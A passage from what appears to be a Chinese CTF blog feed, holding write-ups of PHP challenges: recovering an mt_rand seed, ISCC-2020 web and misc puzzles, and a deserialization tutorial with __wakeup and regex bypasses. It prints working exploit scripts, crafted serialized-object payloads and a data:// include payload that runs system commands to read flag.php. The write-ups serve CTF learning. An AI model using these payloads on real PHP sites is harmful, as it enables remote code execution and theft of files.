class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><br>php伪随机数问题，使用php_mt_seed可以拿到种子<br>在此之前需要将数据转换为php_mt_seed可以处理的格式<br>处理脚本如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'vqrv81C218'</span>   <span class="comment">#这就是题目中给出的前半部分字符串</span></span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)-1)+<span class="string">' '</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><br>处理后的数据为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21 21 0 61 16 16 0 61 17 17 0 61 21 21 0 61 34 34 0 61 27 27 0 61 38 38 0 61 28 28 0 61 27 27 0 61 34 34 0 61</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/php_mt_rand2.jpg" alt=""><br>结果是在PHP7.1。0+环境下的种子是992958350，用该种子就可还原出字符串了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(992958350);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="variable">$len1</span>=20;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(0, strlen(<span class="variable">$str_long1</span>) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>还原出来的字符串为：vqrv81C218G0BdBZrC2V<br>提交即可拿到flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/fake_random/php_mt_rand1.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>ISCC-2020</title>
    <url>/post/3f0f1823.html</url>
    <content><![CDATA[<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/web1.jpg" alt=""><br>测试了下SQL注入，没啥反应，源码也啥都没有<br>dirsearch直接扫，在readme.txt中发现flag</p>
<h4 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h4><p>文件下载下来后，是php代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">function</span> __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">"./&#123;<span class="variable">$this</span>-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents(<span class="variable">$filename</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">return</span> base64_encode(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">'data'</span>];</span><br><span class="line">        <span class="variable">$good</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$good</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="string">'./index.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'test'</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">'test'</span>];</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">"&lt;p&gt;谢谢参与!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>看见unserialize()就知道考察反序列化<br>在反序列化时会触发__toString(),就可利用该函数读出flag.php文件里的内容<br>exp:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">function</span> __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">"./&#123;<span class="variable">$this</span>-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents(<span class="variable">$filename</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">return</span> base64_encode(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$good</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$good</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>payload:?data=O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}<br>界面打印出一段base64编码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgJGE9J2ZsYWd7dV9yX3JlYWxseV9hX3BocF9leHBlcnR9Jzs/Pg0K</span><br></pre></td></tr></table></figure><br>解密后<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">'flag&#123;u_r_really_a_php_expert&#125;'</span>;?&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'hello'</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$file</span>, <span class="string">"file://"</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>=str_replace(<span class="string">"file://"</span>, <span class="string">""</span>, <span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">include(<span class="variable">$file</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>文件包含漏洞，过滤了file协议，换个协议就行了<br>payload:?file=data://text/plain,&lt;?php system(“ls”)?&gt;<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/file.jpg" alt=""><br>发现有flag.php<br>payload:?file=data://text/plain,&lt;?php system(“cat flag.php”)?&gt;<br>在注释中发现了flag{web_include_file}</p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ISCC签到"><a href="#ISCC签到" class="headerlink" title="ISCC签到"></a>ISCC签到</h4><p>吐槽一下：签到题还整个坑，出题人也是够了<br>一张图片，名字是high.png,第一反应修改图片高度，果然在图片底部隐藏有信息<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125;</span><br></pre></td></tr></table></figure><br>提交发现不对，去掉ISCC和括号也不对，变成小写iscc也不对，前缀改成flag还是不对，群里的大佬纷纷讨论，是不是题目有问题，客服来了句这道题有坑，直接了<br>一套子图片隐写工具下来没啥发现，就回到了隐藏信息上<br>想了好久，试了好几种加密方式，最后突发奇想可能是维吉尼亚密码，密钥也试了好几种，差点就觉得不是维吉尼亚密码了<br>突然想到high可能是密码，然后就解出来了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BKWV&#123;W3lcome_to_Mi5C_Wryyy&#125;</span><br></pre></td></tr></table></figure><br>把前缀换成ISCC就可了</p>
<h3 id="寻找小明-1"><a href="#寻找小明-1" class="headerlink" title="寻找小明-1"></a>寻找小明-1</h3><p>stegosolve打开，发现二维码，扫码后的内容是个网址，打开后给了一组数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[257,1,258,2,259,3,260,4,261,5,262,7,263,8,259,277,438,300,455,319,25,300,456,400,66,366,78,300,421,259,452,23]</span><br></pre></td></tr></table></figure><br>这次的ISCC的Misc脑洞真的是大，之后大佬提示说是每两个一组作为图片像素点，然后就会发现每个点的R颜色通道值的ASCII码就是flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">img=cv2.imread(<span class="string">'zx.png'</span>)</span><br><span class="line">x=[257,258,259,260,261,262,263,259,438,455,25,456,66,78,421,452]</span><br><span class="line">y=[1,2,3,4,5,7,8,277,300,319,300,400,366,300,259,23]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):</span><br><span class="line">    px = img[y[i], x[i]]</span><br><span class="line">    <span class="built_in">print</span>(chr(px[2]),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="ISCC成绩查询-1"><a href="#ISCC成绩查询-1" class="headerlink" title="ISCC成绩查询-1"></a>ISCC成绩查询-1</h3><p>stegsolve打开，会发现一张图片<br>很明显是考察图论，在这里就是根据已知的节点编号经过且仅经过一次每一条边得到的边的顺序，再栅栏密码解密即可<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/socre.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">连接后为：TRLNCHHAFCIEEIEEPR</span><br><span class="line">栅栏密码解密后为：THERAILFENCECIPHER</span><br><span class="line">FLAG：flag&#123;THERAILFENCECIPHER&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="是我DIO哒-擂台赛"><a href="#是我DIO哒-擂台赛" class="headerlink" title="是我DIO哒(擂台赛)"></a>是我DIO哒(擂台赛)</h4><p>winhex打开啥也没发现<br>用stegsolve打开发现了一段信息<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/dio.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Useful_Massage_2(fa09fTjBfRCUyMW9fZGFhYWElMjFfXyU3RA==)</span><br></pre></td></tr></table></figure><br>base64解码后是乱码，因为这是第二部分，还缺一部分<br>在kali中用binwalk and foremost 分离出一张二维码，扫码后是第一部分<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Useful_Massage_1(SVNDQyU3QmZsQGdfaXN)</span><br></pre></td></tr></table></figure><br>拼接后base64解码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SVNDQyU3QmZsQGdfaXNfa09fTjBfRCUyMW9fZGFhYWElMjFfXyU3RA==</span><br><span class="line">解码后为：ISCC%7Bfl@g_is_kO_N0_D%21o_daaaa%21__%7D</span><br></pre></td></tr></table></figure><br>明显里面混有URL编码，解码后为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/post/d3333ead.html</url>
    <content><![CDATA[<p>serialize():将一个对象转换成一个字符串<br>unserialize():将字符串还原成一个对象<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class A</span><br><span class="line">	&#123;</span><br><span class="line">		public <span class="variable">$name</span>=<span class="string">"w1ndy"</span>;</span><br><span class="line">		private <span class="variable">$hobby</span>=<span class="string">"basketball"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=new A();</span><br><span class="line">	<span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>结果为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">O:1:<span class="string">"A"</span>:2:&#123;s:4:<span class="string">"name"</span>;s:5:<span class="string">"w1ndy"</span>;s:8:<span class="string">"Ahobby"</span>;s:10:<span class="string">"basketball"</span>;&#125;</span><br></pre></td></tr></table></figure><br>第一个O表示Object，也就是对象，对象名字长度为1，对象名为A,该对象有两个属性(name和hobby)。<br>第一个属性是string类型，属性名长度为4，属性名为name,接着的w1ndy是属性name的值，长度为5.    (public)<br>第二个属性hobby与第一个类似，但是最大的区别就在于属性序列化后的名字是(类名+属性名)，且长度=(属性名长度+2),多加的这两个字符是%00,并不会显示出来，也可以写成这样:%00A%00hobby          (private)<br>在传入序列化字符串进行反序列化时要注意补齐两个空字节<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/unserialize/unserialize_0.PNG" alt=""></p>
<h3 id="极客大挑战-2019-PHP-wakeup-函数绕过"><a href="#极客大挑战-2019-PHP-wakeup-函数绕过" class="headerlink" title="[极客大挑战 2019]PHP(__wakeup()函数绕过)"></a>[极客大挑战 2019]PHP(__wakeup()函数绕过)</h3><p>页面提示网站备份，测试index.php.bak没找到，扫下目录，发现www.zip,下载下来后<br>在index.php中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include <span class="string">'class.php'</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">'select'</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><br>在class.php中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private <span class="variable">$username</span> = <span class="string">'nonono'</span>;</span><br><span class="line">    private <span class="variable">$password</span> = <span class="string">'yesyes'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$username</span>,<span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;password != 100) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;username;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;password;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            global <span class="variable">$flag</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>要想拿到flag，必须满足:username=admin&amp;password=100<br>这里password很容易满足，但是username不然，传入的字符串进行反序列化时会触发<strong>wakeup()函数，username的值会被代替为”guest”，从而无法满足条件<br>绕过方法：当反序列化字符串中表示的属性个数大于真实属性个数时，会跳过 </strong>wakeup 函数的执行<br>在这里就是利用这一点<br>构造payload：?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}<br>这里本来Name类有两个属性，为了跳过__wakeup()函数，修改属性个数(要大于本来的个数)为3，成功拿到flag<br><a href="http://vulhub.org.cn/vuln/VH-CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a></p>
<h3 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="[攻防世界]Web_php_unserialize"></a>[攻防世界]Web_php_unserialize</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            //the secret is <span class="keyword">in</span> the fl4g.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, <span class="variable">$var</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        die(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>未绕过前：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">"Demo"</span>:1:&#123;s:10:<span class="string">"Demofile"</span>;s:8:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>在序列化字符串中对象的长度处过滤了数字,用+4替换成4是可绕过这一点<br>再利用<strong>wakeup()函数的漏洞跳过</strong>wakeup函数执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Demo</span><br><span class="line">	&#123;</span><br><span class="line">		private <span class="variable">$file</span> = <span class="string">'fl4g.php'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=new Demo();</span><br><span class="line">	<span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">	<span class="variable">$b</span> = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$b</span> = str_replace(<span class="string">':1:'</span>, <span class="string">':3:'</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="built_in">echo</span> (base64_encode(<span class="variable">$b</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>payload:?var=TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br>tip:这里有个坑，因为privite属性的值在序列化时名字中会有%00,序列化字符中并没有打印出来，不要手动绕过，否则很容易去掉隐藏的字符，导致payload错误</p>
<h3 id="安恒月赛-Ezunserialize"><a href="#安恒月赛-Ezunserialize" class="headerlink" title="[安恒月赛]Ezunserialize"></a>[安恒月赛]Ezunserialize</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> write(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> str_replace(chr(0) . <span class="string">'*'</span> . chr(0), <span class="string">'\0\0\0'</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">read</span>(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(0) . <span class="string">'*'</span> . chr(0), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$a</span>, <span class="variable">$b</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public <span class="variable">$b</span> = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">'a'</span>.<span class="variable">$this</span>-&gt;b;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        //flag.php</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new A(<span class="variable">$_GET</span>[<span class="string">'a'</span>],<span class="variable">$_GET</span>[<span class="string">'b'</span>]);</span><br><span class="line">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line"><span class="variable">$b</span> = unserialize(<span class="built_in">read</span>(write(serialize(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure>
<h3 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public <span class="variable">$correct</span> = <span class="string">""</span>;</span><br><span class="line">   public <span class="variable">$input</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;correct === <span class="variable">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="built_in">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'pleaseget'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'pleasepost'</span>] === <span class="string">'2'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">'md51'</span>]) == md5(<span class="variable">$_POST</span>[<span class="string">'md52'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'md51'</span>] != <span class="variable">$_POST</span>[<span class="string">'md52'</span>]) &#123;</span><br><span class="line">            unserialize(<span class="variable">$_POST</span>[<span class="string">'obj'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先是一堆绕过，然后反序列化<br>绕过很简单，重点在反序列化<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public <span class="variable">$correct</span> = <span class="string">""</span>;</span><br><span class="line">   public <span class="variable">$input</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;correct === <span class="variable">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="built_in">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new BUU();</span><br><span class="line"><span class="variable">$a</span>-&gt;input=&amp;<span class="variable">$a</span>-&gt;correct; //关键点</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>构造payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">以get方式传参   ?pleaseget=1</span><br><span class="line">以post方式传参      pleasepost=2&amp;md51[]=a&amp;md52[]=b&amp;obj=O:3:<span class="string">"BUU"</span>:2:&#123;s:7:<span class="string">"correct"</span>;s:0:<span class="string">""</span>;s:5:<span class="string">"input"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure><br>拿到flag{4f080ca0-191d-44f7-a076-790e8210cf87} </p>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span 